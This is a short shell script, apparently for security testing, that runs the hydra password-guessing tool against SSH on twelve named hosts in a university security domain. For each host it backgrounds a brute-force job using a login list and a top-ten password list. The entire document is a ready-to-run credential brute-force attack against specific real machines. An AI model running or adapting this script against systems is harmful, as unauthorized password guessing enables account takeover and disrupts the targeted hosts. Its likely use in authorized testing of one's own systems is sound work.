#!/bin/sh

for i in $(seq 1 12); do
    j=`printf %02d $i`
   /usr/local/bin/hydra -t 4 vt${j}.security.ncsa.illinois.edu  -u -L ./logins.txt -P ./top10.txt -V ssh &
   sleep 3
done
